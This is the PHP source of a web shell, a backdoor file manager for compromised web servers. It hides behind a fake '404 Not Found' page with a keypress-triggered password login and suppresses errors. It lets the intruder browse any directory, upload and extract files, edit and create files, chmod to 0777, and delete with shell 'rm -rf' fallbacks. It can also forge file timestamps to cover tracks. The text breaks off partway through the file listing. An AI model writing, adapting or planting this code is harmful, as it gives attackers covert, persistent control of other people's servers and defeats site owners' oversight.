<?php
$__k0__ = 'Y' . 'mFzZTY0X2RlY29kZQ==';
$__k1__ = 'c2Vzc2lvbl9zdGFydA==';
$__k2__ = 'aXNzZXQ=';
$__k3__ = 'aGVhZGVy';
$__k4__ = 'cGFzc3dvcmRfdmVyaWZ5';

@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set('allow_url_fopen', 1);
@ini_set('allow_url_include', 1);

function __d($s) { return base64_decode($s); }

if (!session_id()) {
    session_start();
}

$__pass_hash__ = '$2a$12$k.10u4gPugELoI4HwQZTHe.S5i7jzlkzcmms2bZQfw8cgPIEE6VVC';
$__auth__ = false;

if (isset($_SESSION['__auth__']) && $_SESSION['__auth__'] === true) {
    $__auth__ = true;
} elseif (isset($_POST['__p__'])) {
    if (password_verify($_POST['__p__'], $__pass_hash__)) {
        $_SESSION['__auth__'] = true;
        header("Location: " . $_SERVER["PHP_SELF"]);
        exit;
    }
}

if (!$__auth__) {
    if (!isset($_GET['__l__'])) {
        echo '<!DOCTYPE html><html><head><title>404 Not Found .</title><style>body{background:#ffffff;color:#0f0;font-family:monospace;height:100vh;display:flex;justify-content:center;align-items:center;margin:0;}</style></head><body><div></div><script>document.addEventListener("keydown",e=>{if(e.key==="PageUp")location.href="?__l__=1";});</script></body></html>';
        exit;
    }
    
    echo '<!DOCTYPE html><html><head><title>Login</title><style>body{background: url("https://i.pinimg.com/originals/f5/f2/74/f5f27448c036af645c27467c789ad759.gif");background-size: 90% 90% ;cover;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}form{background:#222;padding:30px;border:1px solid #0f0;border-radius:10px;}input,button{width:100%;padding:10px;margin:10px 0;background:#000;color:#0f0;border:1px solid #555;}button{cursor:pointer;}</style></head><body><form method="post"><h3>HAJAR PALLKU</h3><input type="password" name="__p__" placeholder="Password" required><button type="submit">GassPalku</button></form></body></html>';
    exit;
}

$__dir__ = isset($_GET['__d__']) ? $_GET['__d__'] : getcwd();
$__dir__ = str_replace("\\", "/", $__dir__);
if (!is_dir($__dir__)) $__dir__ = getcwd();

if (isset($_FILES['__up__'])) {
    $__target__ = $__dir__ . '/' . basename($_FILES['__up__']['name']);
    if (move_uploaded_file($_FILES['__up__']['tmp_name'], $__target__)) {
        echo '<div style="background:rgba(0,0,0,0.85);color:#00ff00;padding:12px;margin:10px;border-radius:5px;border-left:4px solid lime;font-weight:bold;">✅ Uploaded: ' . basename($__target__) . '</div>';
    } else {
        echo '<div style="background:rgba(0,0,0,0.85);color:#ff5555;padding:12px;margin:10px;border-radius:5px;border-left:4px solid red;font-weight:bold;">❌ Upload gagal! Periksa permission folder.</div>';
    }
}

if (isset($_FILES['__zip__'])) {
    if (class_exists('ZipArchive')) {
        $__zip__ = new ZipArchive;
        if ($__zip__->open($_FILES['__zip__']['tmp_name']) === TRUE) {
            $__zip__->extractTo($__dir__);
            $__zip__->close();
            echo '<div style="background:rgba(0,0,0,0.85);color:#00ff00;padding:12px;margin:10px;border-radius:5px;border-left:4px solid lime;font-weight:bold;">✅ ZIP extracted: ' . $_FILES['__zip__']['name'] . '</div>';
        } else {
            echo '<div style="background:rgba(0,0,0,0.85);color:#ff5555;padding:12px;margin:10px;border-radius:5px;border-left:4px solid red;font-weight:bold;">❌ Gagal membuka ZIP file</div>';
        }
    } else {
        echo '<div style="background:rgba(0,0,0,0.85);color:#ff5555;padding:12px;margin:10px;border-radius:5px;border-left:4px solid red;font-weight:bold;">❌ ZipArchive tidak tersedia</div>';
    }
}

if (isset($_GET['__chmod__'])) {
    $__target__ = $__dir__ . '/' . basename($_GET['__chmod__']);
    if (file_exists($__target__)) {
        if (isset($_POST['__mode__'])) {
            $__mode__ = octdec($_POST['__mode__']);
            if (chmod($__target__, $__mode__)) {
                echo '<div style="background:rgba(0,0,0,0.85);color:#00ff00;padding:12px;margin:10px;border-radius:5px;border-left:4px solid lime;font-weight:bold;">✅ Chmod success: ' . decoct($__mode__) . '</div>';
            }
        } else {
            $__current__ = substr(sprintf('%o', fileperms($__target__)), -4);
            echo '<div style="background:rgba(0,0,0,0.92);padding:20px;margin:20px;border-radius:10px;border:2px solid gold;">
                    <h3 style="color:gold;margin-top:0;font-weight:900;">🔧 CHMOD: ' . basename($__target__) . '</h3>
                    <form method="post">
                        <p style="color:#e0e0e0;font-weight:bold;">Current: <strong style="color:#00ff00;">' . $__current__ . '</strong></p>
                        <select name="__mode__" style="width:100%;padding:10px;background:#111;color:#00ff00;border:1px solid #555;margin:10px 0;font-weight:bold;">
                            <option value="0644">0644 (-rw-r--r--) File</option>
                            <option value="0755">0755 (-rwxr-xr-x) Executable</option>
                            <option value="0777">0777 (-rwxrwxrwx) Full Access</option>
                            <option value="0700">0700 (-rwx------) Owner Only</option>
                            <option value="0444">0444 (-r--r--r--) Read Only</option>
                        </select>
                        <input type="text" name="__custom__" placeholder="Custom (e.g., 0755)" style="width:100%;padding:10px;background:#111;color:#00ff00;border:1px solid #555;font-weight:bold;">
                        <br><br>
                        <button type="submit" style="background:gold;color:#000;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-weight:900;">Apply Chmod</button>
                        <a href="?__d__=' . urlencode($__dir__) . '" style="color:#e0e0e0;margin-left:10px;font-weight:bold;">Cancel</a>
                    </form>
                  </div>';
            exit;
        }
    }
}

if (isset($_GET['__rename__'])) {
    $__target__ = $__dir__ . '/' . basename($_GET['__rename__']);
    if (file_exists($__target__)) {
        if (isset($_POST['__newname__'])) {
            $__new__ = $__dir__ . '/' . $_POST['__newname__'];
            if (rename($__target__, $__new__)) {
                echo '<div style="background:rgba(0,0,0,0.85);color:#00ff00;padding:12px;margin:10px;border-radius:5px;border-left:4px solid cyan;font-weight:bold;">✅ Rename success!</div>';
                echo '<script>location.href="?__d__=' . urlencode($__dir__) . '";</script>';
                exit;
            }
        } else {
            $__current__ = basename($__target__);
            echo '<div style="background:rgba(0,0,0,0.92);padding:20px;margin:20px;border-radius:10px;border:2px solid cyan;">
                    <h3 style="color:cyan;margin-top:0;font-weight:900;">📝 RENAME: ' . $__current__ . '</h3>
                    <form method="post">
                        <input type="text" name="__newname__" value="' . $__current__ . '" style="width:100%;padding:10px;background:#111;color:#00ff00;border:1px solid #555;margin:10px 0;font-weight:bold;" required>
                        <br><br>
                        <button type="submit" style="background:cyan;color:#000;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-weight:900;">Rename</button>
                        <a href="?__d__=' . urlencode($__dir__) . '" style="color:#e0e0e0;margin-left:10px;font-weight:bold;">Cancel</a>
                    </form>
                  </div>';
            exit;
        }
    }
}

if (isset($_GET['__touch__'])) {
    $__target__ = $__dir__ . '/' . basename($_GET['__touch__']);
    if (file_exists($__target__)) {
        if (isset($_POST['__datetime__'])) {
            $__datetime__ = strtotime($_POST['__datetime__']);
            if (touch($__target__, $__datetime__, $__datetime__)) {
                echo '<div style="background:rgba(0,0,0,0.85);color:#00ff00;padding:12px;margin:10px;border-radius:5px;border-left:4px solid magenta;font-weight:bold;">✅ Timestamp updated: ' . date('Y-m-d H:i:s', $__datetime__) . '</div>';
                echo '<script>location.href="?__d__=' . urlencode($__dir__) . '";</script>';
                exit;
            }
        } else {
            $__current__ = filemtime($__target__);
            $__current_date__ = date('Y-m-d\TH:i', $__current__);
            echo '<div style="background:rgba(0,0,0,0.92);padding:20px;margin:20px;border-radius:10px;border:2px solid magenta;">
                    <h3 style="color:magenta;margin-top:0;font-weight:900;">🕒 EDIT TIMESTAMP: ' . basename($__target__) . '</h3>
                    <form method="post">
                        <p style="color:#e0e0e0;font-weight:bold;">Current: <strong style="color:#00ff00;">' . date('Y-m-d H:i:s', $__current__) . '</strong></p>
                        <input type="datetime-local" name="__datetime__" value="' . $__current_date__ . '" style="width:100%;padding:10px;background:#111;color:#00ff00;border:1px solid #555;margin:10px 0;font-weight:bold;" required>
                        <br><br>
                        <button type="submit" style="background:magenta;color:#000;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-weight:900;">Update Timestamp</button>
                        <a href="?__d__=' . urlencode($__dir__) . '" style="color:#e0e0e0;margin-left:10px;font-weight:bold;">Cancel</a>
                    </form>
                  </div>';
            exit;
        }
    }
}

if (isset($_GET['__extract__'])) {
    $__target__ = $__dir__ . '/' . basename($_GET['__extract__']);
    if (file_exists($__target__) && class_exists('ZipArchive')) {
        $__zip__ = new ZipArchive;
        if ($__zip__->open($__target__) === TRUE) {
            $__zip__->extractTo($__dir__);
            $__zip__->close();
            echo '<div style="background:rgba(0,0,0,0.85);color:#00ff00;padding:12px;margin:10px;border-radius:5px;border-left:4px solid orange;font-weight:bold;">✅ ZIP extracted: ' . basename($__target__) . '</div>';
            echo '<script>location.href="?__d__=' . urlencode($__dir__) . '";</script>';
            exit;
        } else {
            echo '<div style="background:rgba(0,0,0,0.85);color:#ff5555;padding:12px;margin:10px;border-radius:5px;border-left:4px solid red;font-weight:bold;">❌ Failed to extract ZIP file</div>';
        }
    } else {
        echo '<div style="background:rgba(0,0,0,0.85);color:#ff5555;padding:12px;margin:10px;border-radius:5px;border-left:4px solid red;font-weight:bold;">❌ ZIP extension not available or file not found</div>';
    }
}

if (isset($_GET['__del__'])) {
    $__target__ = $__dir__ . '/' . basename($_GET['__del__']);
    if (file_exists($__target__)) {
        $__success__ = false;
        
        if (is_dir($__target__)) {
            function __delete_folder($dir) {
                if (!is_dir($dir)) {
                    return unlink($dir);
                }
                
                $files = array_diff(scandir($dir), array('.', '..'));
                foreach ($files as $file) {
                    $path = $dir . '/' . $file;
                    if (is_dir($path)) {
                        __delete_folder($path);
                    } else {
                        @unlink($path);
                    }
                }
                return @rmdir($dir);
            }
            
            $__success__ = __delete_folder($__target__);
            
            if (!$__success__) {
                if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
                    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                        system('rmdir /s /q ' . escapeshellarg($__target__) . ' 2>&1', $__result__);
                        $__success__ = ($__result__ === 0);
                    } else {
                        system('rm -rf ' . escapeshellarg($__target__) . ' 2>&1', $__result__);
                        $__success__ = ($__result__ === 0);
                    }
                }
            }
            
            if (!$__success__ && function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                    exec('rmdir /s /q ' . escapeshellarg($__target__) . ' 2>&1', $__output__, $__result__);
                    $__success__ = ($__result__ === 0);
                } else {
                    exec('rm -rf ' . escapeshellarg($__target__) . ' 2>&1', $__output__, $__result__);
                    $__success__ = ($__result__ === 0); 
                }
            }
            
        } else {
            $__success__ = @unlink($__target__);
            
            if (!$__success__ && function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                    system('del /f /q ' . escapeshellarg($__target__) . ' 2>&1', $__result__);
                    $__success__ = ($__result__ === 0);
                } else {
                    system('rm -f ' . escapeshellarg($__target__) . ' 2>&1', $__result__);
                    $__success__ = ($__result__ === 0);
                }
            }
        }
        
        if ($__success__) {
            echo '<script>alert("✅ Berhasil dihapus!"); location.href="?__d__=' . urlencode($__dir__) . '";</script>';
        } else {
            echo '<script>alert("❌ Gagal menghapus! Periksa permission folder."); location.href="?__d__=' . urlencode($__dir__) . '";</script>';
        }
        exit;
    }
}

if (isset($_GET['__edit__'])) {
    $__target__ = $__dir__ . '/' . basename($_GET['__edit__']);
    if (file_exists($__target__) && is_file($__target__)) {
        if (isset($_POST['__content__'])) {
            file_put_contents($__target__, $_POST['__content__']);
            echo '<div style="background:rgba(0,0,0,0.85);color:#00ff00;padding:12px;margin:10px;border-radius:5px;border-left:4px solid lime;font-weight:bold;">✅ File saved!</div>';
            echo '<script>location.href="?__d__=' . urlencode($__dir__) . '";</script>';
            exit;
        }
        $__content__ = htmlspecialchars(file_get_contents($__target__));
        echo '<div style="background:rgba(0,0,0,0.95);padding:20px;margin:20px;border-radius:10px;border:2px solid #00ff00;">
                <h3 style="color:#00ff00;margin-top:0;font-weight:900;">📝 EDIT: ' . basename($__target__) . '</h3>
                <form method="post">
                    <textarea name="__content__" style="width:100%;height:400px;background:#111;color:#00ff00;border:1px solid #555;padding:10px;font-family:monospace;font-weight:bold;">' . $__content__ . '</textarea>
                    <br><br>
                    <button type="submit" style="background:#00ff00;color:#000;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-weight:900;">Save</button>
                    <a href="?__d__=' . urlencode($__dir__) . '" style="color:#e0e0e0;margin-left:10px;font-weight:bold;">Cancel</a>
                </form>
              </div>';
        exit;
    }
}

if (isset($_POST['__create__'])) {
    $__name__ = $_POST['__name__'];
    $__type__ = $_POST['__type__'];
    $__path__ = $__dir__ . '/' . $__name__;
    
    if ($__type__ === 'file') {
        if (file_put_contents($__path__, $_POST['__data__'] ?? '')) {
            echo '<div style="background:rgba(0,0,0,0.85);color:#00ff00;padding:12px;margin:10px;border-radius:5px;border-left:4px solid lime;font-weight:bold;">✅ File created: ' . $__name__ . '</div>';
        } else {
            echo '<div style="background:rgba(0,0,0,0.85);color:#ff5555;padding:12px;margin:10px;border-radius:5px;border-left:4px solid red;font-weight:bold;">❌ Gagal membuat file</div>';
        }
    } else {
        if (mkdir($__path__, 0777, true)) {
            echo '<div style="background:rgba(0,0,0,0.85);color:#00ff00;padding:12px;margin:10px;border-radius:5px;border-left:4px solid lime;font-weight:bold;">✅ Folder created: ' . $__name__ . '</div>';
        } else {
            echo '<div style="background:rgba(0,0,0,0.85);color:#ff5555;padding:12px;margin:10px;border-radius:5px;border-left:4px solid red;font-weight:bold;">❌ Gagal membuat folder</div>';
        }
    }
}

function __format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function __get_perm($file) {
    $perm = fileperms($file);
    $info = '';
    $info .= (($perm & 0x4000) ? 'd' : '-');
    $info .= (($perm & 0x0100) ? 'r' : '-');
    $info .= (($perm & 0x0080) ? 'w' : '-');
    $info .= (($perm & 0x0040) ? 'x' : '-');
    $info .= (($perm & 0x0020) ? 'r' : '-');
    $info .= (($perm & 0x0010) ? 'w' : '-');
    $info .= (($perm & 0x0008) ? 'x' : '-');
    $info .= (($perm & 0x0004) ? 'r' : '-');
    $info .= (($perm & 0x0002) ? 'w' : '-');
    $info .= (($perm & 0x0001) ? 'x' : '-');
    return $info;
}

function __perm_color($perm, $is_writable) {
    if ($is_writable) {
        return '#00ff00';
    } else {
        return '#ffffff';
    }
}

function __is_writable($file) {
    return is_writable($file);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Ula Km Sangsi Pall</title>
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --bg-dark: #0a0a0a;
            --bg-card: rgba(0, 0, 0, 0.65);
            --text-primary: #00ff00;
            --text-secondary: #e8e8e8;
            --accent-gold: #FFD700;
            --accent-red: #ff1414;
            --accent-blue: #00BFFF;
            --accent-cyan: #00ffff;
            --accent-magenta: #FF00FF;
            --border-color: rgba(255, 215, 0, 0.4);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.55)), 
                        url('https://i.ibb.co/shCm90R/photo-2026-09-20-12-13-02.jpg') no-repeat center center fixed;
            background-size: cover;
            color: var(--text-primary);
            padding: 20px;
            min-height: 100vh;
            font-weight: 700;
            letter-spacing: 0.3px;
            text-shadow: 0 0 4px rgba(0,0,0,0.95), 0 1px 2px rgba(0,0,0,1);
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            padding: 15px;
            background: var(--bg-card);
            border-radius: 8px;
            margin-bottom: 10px;
            border: 2px solid var(--accent-gold);
            box-shadow: 0 0 25px rgba(255, 215, 0, 0.35);
        }
        
        .breadcrumb {
            background: var(--bg-card);
            padding: 10px 14px;
            border-radius: 5px;
            margin-bottom: 10px;
            font-size: 14px;
            border: 1px solid var(--border-color);
            font-weight: 800;
        }
        
        .form-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .form-box {
            background: var(--bg-card);
            padding: 14px;
            border-radius: 5px;
            border: 1px solid var(--border-color);
            flex: 1;
            min-width: 250px;
        }
        
        .form-box h3 {
            margin-top: 0;
            margin-bottom: 10px;
            font-size: 14px;
            color: var(--accent-gold);
            font-weight: 900;
            text-shadow: 0 0 6px rgba(255, 215, 0, 0.7), 0 0 3px rgba(0,0,0,1);
        }
        
        .form-box input,
        .form-box select,
        .form-box textarea {
            width: 100%;
            padding: 8px;
            margin-bottom: 6px;
            background: rgba(15, 15, 15, 0.95);
            color: var(--text-primary);
            border: 1px solid rgba(255, 215, 0, 0.35);
            border-radius: 3px;
            font-size: 13px;
            font-family: 'Courier New', monospace;
            font-weight: 700;
        }
        
        .form-box button {
            width: 100%;
            padding: 9px;
            background: linear-gradient(135deg, var(--accent-gold), #B8860B);
            color: #000;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-weight: 900;
            font-size: 13px;
            text-shadow: none;
        }
        
        .form-box button:hover {
            background: linear-gradient(135deg, #B8860B, var(--accent-gold));
        }
        
        .btn {
            padding: 6px 12px;
            background: linear-gradient(135deg, var(--accent-gold), #B8860B);
            color: #000;
            border: none;
            border-radius: 3px;
            text-decoration: none;
            cursor: pointer;
            font-weight: 900;
            transition: all 0.3s;
            display: inline-block;
            font-size: 12px;
            text-shadow: none;
        }
        
        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 3px 12px rgba(255, 215, 0, 0.45);
        }
        
        .btn-chmod {
            background: linear-gradient(135deg, #00BFFF, #1E90FF);
            color: #fff;
        }
        
        .btn-rename {
            background: linear-gradient(135deg, #00ffff, #20B2AA);
            color: #000;
        }
        
        .btn-timestamp {
            background: linear-gradient(135deg, #FF00FF, #8B008B);
            color: #fff;
        }
        
        .btn-edit {
            background: linear-gradient(135deg, #00ff00, #32CD32);
            color: #000;
        }
        
        .btn-delete {
            background: linear-gradient(135deg, #ff1414, #8B0000);
            color: #fff;
        }
        
        .btn-extract {
            background: linear-gradient(135deg, #FFA500, #FF8C00);
            color: #000;
        }
        
        .file-table {
            width: 100%;
            background: var(--bg-card);
            border-collapse: collapse;
            margin-bottom: 20px;
            font-size: 13px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            overflow: hidden;
        }
        
        .file-table th {
            background: rgba(25, 25, 25, 0.95);
            padding: 12px;
            text-align: left;
            color: var(--accent-gold);
            border-bottom: 2px solid var(--accent-gold);
            font-size: 14px;
            font-weight: 900;
            text-shadow: 0 0 5px rgba(255, 215, 0, 0.6), 0 0 2px rgba(0,0,0,1);
        }
        
        .file-table td {
            padding: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.12);
            color: var(--text-secondary);
            font-size: 13px;
            font-weight: 700;
        }
        
        .file-table tr:hover {
            background: rgba(255, 215, 0, 0.12);
        }
        
        .perm-legend-box {
            background: rgba(0, 0, 0, 0.85);
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            border: 2px solid var(--accent-gold);
            font-size: 13px;
            font-weight: 700;
        }
        
        .perm-legend-header {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 1px solid rgba(255, 215, 0, 0.35);
        }
        
        .perm-legend-header h3 {
            margin: 0;
            font-size: 15px;
            color: var(--accent-gold);
            font-weight: 900;
        }
        
        .perm-legend-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 10px;
        }
        
        .perm-legend-item {
            display: flex;
            align-items: center;
            padding: 8px;
            background: rgba(20, 20, 20, 0.75);
            border-radius: 5px;
            border: 1px solid rgba(255, 255, 255, 0.15);
        }
        
        .perm-color-box {
            width: 20px;
            height: 20px;
            border-radius: 4px;
            margin-right: 10px;
            border: 2px solid rgba(255, 255, 255, 0.25);
        }
        
        .perm-color-green {
            background: #00ff00;
        }
        
        .perm-color-white {
            background: #ffffff;
        }
        
        .perm-info {
            flex: 1;
        }
        
        .perm-name {
            font-weight: 900;
            font-size: 13px;
            color: var(--text-primary);
        }
        
        .perm-desc {
            font-size: 11px;
            color: #c0c0c0;
            margin-top: 2px;
            font-weight: 700;
        }
        
        .terminal {
            background: #000;
            color: var(--text-primary);
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border: 1px solid var(--accent-gold);
            font-family: 'Courier New', monospace;
            font-size: 13px;
            font-weight: 700;
        }
        
        .terminal h3 {
            font-weight: 900;
        }
        
        .terminal pre {
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
            background: #111;
            padding: 10px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: 700;
            line-height: 1.5;
        }
        
        .footer {
            text-align: center;
            padding: 15px;
            color: #39FF14;
            font-size: 12px;
            margin-top: 25px;
            border-top: 1px solid rgba(255,215,0,0.25);
            font-weight: 800;
        }
        
        .action-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
        }
        
        .action-buttons .btn {
            padding: 5px 9px;
            font-size: 11px;
        }
        
        .perm-badge {
            font-family: monospace;
            padding: 4px 7px;
            border-radius: 4px;
            font-size: 12px;
            background: rgba(255,255,255,0.12);
            border: 1px solid rgba(255, 255, 255, 0.25);
            font-weight: 900;
        }
        
        .folder-name {
            color: #00ff00 !important;
            font-weight: 900;
        }
        
        .file-name {
            color: #ffffff !important;
            font-weight: 800;
        }
        
        @media (max-width: 768px) {
            .form-box {
                min-width: 100%;
            }
            
            .file-table {
                font-size: 12px;
            }
            
            .perm-legend-grid {
                grid-template-columns: 1fr;
            }
            
            .action-buttons {
                flex-direction: column;
            }
        }

        .info-bar {
            background: rgba(0,0,0,0.8);
            padding: 10px 14px;
            margin: 10px 0;
            border-left: 5px solid gold;
            font-size: 13px;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            border-radius: 4px;
            font-weight: 800;
            color: #e8e8e8;
        }
        
        .info-bar strong {
            color: var(--accent-gold);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 style="font-size: 20px; margin-bottom: 5px; font-weight: 900; text-shadow: 0 0 8px rgba(0,255,0,0.6), 0 0 4px rgba(0,0,0,1);">𝐀𝐏𝐀 𝐂𝐀𝐑𝐈𝐊🏴</h1>
            <span style="color:gold; font-weight: 900; text-shadow: 0 0 6px rgba(255,215,0,0.7), 0 0 3px rgba(0,0,0,1);">𝐀𝐦𝐚𝐧 𝐀𝐣𝐚 𝐋𝐚𝐡 𝐏𝐚𝐥𝐥𝐤𝐮
</span>
            <p style="font-size: 13px; margin-top: 8px; font-weight: 700;">
                ▄︻テ══━一💥:: 
                <?php
                $path_parts = explode('/', trim($__dir__, '/'));
                $current_path = '';
                
                echo '<a href="?__d__=/" style="color:#00ff00; text-decoration:none; border-bottom:1px dashed #00ff00; cursor:pointer; font-weight:900;">/</a>';
                
                foreach ($path_parts as $index => $part) {
                    if (!empty($part)) {
                        $current_path .= '/' . $part;
                        echo '<a href="?__d__=' . urlencode($current_path) . '" style="color:#00ff00; text-decoration:none; border-bottom:1px dashed #00ff00; cursor:pointer; font-weight:900;">';
                        echo htmlspecialchars($part);
                        echo '</a>';
                        
                        if ($index < count($path_parts) - 1) {
                            echo '<span style="color:#e0e0e0;">/</span>';
                        }
                    }
                }
                ?>
            </p>
        </div>

        <div class="info-bar">
            <span>📁 <strong>Current:</strong> <?php echo htmlspecialchars($__dir__); ?></span>
            <span>📊 <strong>PHP:</strong> <?php echo PHP_VERSION; ?></span>
            <span>⬆️ <strong>Max Upload:</strong> <?php echo ini_get('upload_max_filesize'); ?></span>
            <span>📝 <strong>Status:</strong> <?php echo is_writable($__dir__) ? '✅ Writable' : '❌ Read Only'; ?></span>
        </div>
        
        <div class="breadcrumb">
            <a href="?__d__=<?php echo urlencode(dirname($__dir__)); ?>" class="btn">← Parent</a>
            <a href="?__d__=<?php echo urlencode(getcwd()); ?>" class="btn">🚢 Home</a>
            <span style="color:#e0e0e0; margin: 0 8px;">|</span>
            <span style="color:var(--accent-gold); font-size: 13px; font-weight: 900;"><?php echo basename($__dir__) ?: '/'; ?></span>
        </div>
        
        <div class="form-grid">
            <div class="form-box" id="upload">
                <h3>🚢 Upload File</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="__up__" required>
                    <button type="submit" class="btn">Upload</button>
                </form>
            </div>
            
            <div class="form-box" id="zip">
                <h3>💀 Upload & Extract ZIP</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="__zip__" accept=".zip" required>
                    <button type="submit" class="btn btn-extract">Upload & Extract</button>
                </form>
            </div>
            
            <div class="form-box" id="create">
                <h3>➕ Create New</h3>
                <form method="post">
                    <input type="text" name="__name__" placeholder="Name" required>
                    <select name="__type__">
                        <option value="file">📄 File</option>
                        <option value="folder">📁 Folder</option>
                    </select>
                    <textarea name="__data__" placeholder="Content (for files)" rows="2"></textarea>
                    <input type="hidden" name="__create__" value="1">
                    <button type="submit" class="btn">Create</button>
                </form>
            </div>
        </div>
        
        <table class="file-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Modified</th>
                    <th>Actions</th>
                    <th>Rename</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $__items__ = scandir($__dir__);
                
                $folders = [];
                $files = [];
                
                foreach ($__items__ as $__item__) {
                    if ($__item__ == '.' || $__item__ == '..') continue;
                    
                    $__path__ = $__dir__ . '/' . $__item__;
                    $__is_dir__ = is_dir($__path__);
                    
                    if ($__is_dir__) {
                        $folders[] = $__item__;
                    } else {
                        $files[] = $__item__;
                    }
                }
                
                foreach ($folders as $__item__) {
                    $__path__ = $__dir__ . '/' . $__item__;
                    $__size__ = '-';
                    $__perm_octal__ = substr(sprintf('%o', fileperms($__path__)), -4);
                    $__perm_str__ = __get_perm($__path__);
                    $__writable__ = __is_writable($__path__);
                    $__perm_color__ = __perm_color($__perm_octal__, $__writable__);
                    $__modified__ = date('Y-m-d H:i', filemtime($__path__));
                    
                    echo '<tr>';
                    echo '<td class="folder-name">';
                    echo '📁 ';
                    echo '<a href="?__d__=' . urlencode($__path__) . '" style="color:#00ff00;font-weight:900;text-decoration:none;">' . htmlspecialchars($__item__) . '</a>';
                    echo '</td>';
                    echo '<td><span style="font-size:12px;font-weight:800;">' . $__size__ . '</span></td>';
                    echo '<td>';
                    echo '<span class="perm-badge" style="color:' . $__perm_color__ . ';border-color:' . $__perm_color__ . ';">' . $__perm_str__ . '</span>';
                    echo '<br><small style="color:#b0b0b0;font-size:11px;margin-top:3px;display:inline-block;font-weight:700;">(' . $__perm_octal__ . ')</small>';
                    echo '</td>';
                    echo '<td><span style="font-size:12px;font-weight:800;">' . $__modified__ . '</span></td>';
                    echo '<td>';
                    echo '<div class="action-buttons">';
                    echo '<a href="?__d__=' . urlencode($__dir__) . '&__touch__=' . urlencode($__item__) . '" class="btn btn-timestamp" title="Edit Timestamp">🕒 Time</a>';
                    echo '<a href="?__d__=' . urlencode($__dir__) . '&__chmod__=' . urlencode($__item__) . '" class="btn btn-chmod">🔧 Chmod</a>';
                    echo '<a href="?__d__=' . urlencode($__dir__) . '&__del__=' . urlencode($__item__) . '" onclick="return confirm(\'Delete ' . htmlspecialchars($__item__) . '?\')" class="btn btn-delete">🗑 Delete</a>';
                    echo '</div>';
                    echo '</td>';
                    echo '<td>';
                    echo '<a href="?__d__=' . urlencode($__dir__) . '&__rename__=' . urlencode($__item__) . '" class="btn btn-rename">📝 Rename</a>';
                    echo '</td>';
                    echo '</tr>';
                }
                
                foreach ($files as $__item__) {
                    $__path__ = $__dir__ . '/' . $__item__;
                    $__size__ = __format_size(filesize($__path__));
                    $__perm_octal__ = substr(sprintf('%o', fileperms($__path__)), -4);
                    $__perm_str__ = __get_perm($__path__);
                    $__writable__ = __is_writable($__path__);
                    $__perm_color__ = __perm_color($__perm_octal__, $__writable__);
                    $__modified__ = date('Y-m-d H:i', filemtime($__path__));
                    
                    echo '<tr>';
                    echo '<td class="file-name">';
                    echo '📄 ';
                    echo '<span>' . htmlspecialchars($__item__) . '</span>';
                    echo '</td>';
                    echo '<td><span style="font-size:12px;font-weight:800;">' . $__size__ . '</span></td>';
                    echo '<td>';
                    echo '<span class="perm-badge" style="color:' . $__perm_color__ . ';border-color:' . $__perm_color__ . ';">' . $__perm_str__ . '</span>';
                    echo '<br><small style="color:#b0b0b0;font-size:11px;margin-top:3px;display:inline-block;font-weight:700;">(' . $__perm_octal__ . ')</small>';
                    echo '</td>';
                    echo '<td><span style="font-size:12px;font-weight:800;">' . $__modified__ . '</span></td>';
                    echo '<td>';
                    echo '<div class="action-buttons">';
                    echo '<a href="?__d__=' . urlencode($__dir__) . '&__edit__=' . urlencode($__item__) . '" class="btn btn-edit">✏️ Edit</a>';
                    echo '<a href="?__d__=' . urlencode($__dir__) . '&__touch__=' . urlencode($__item__) . '" class="btn btn-timestamp" title="Edit Timestamp">🕒 Time</a>';
                    echo '<a href="?__d__=' . urlencode($__dir__) . '&__chmod__=' . urlencode($__item__) . '" class="btn btn-chmod">🔧 Chmod</a>';
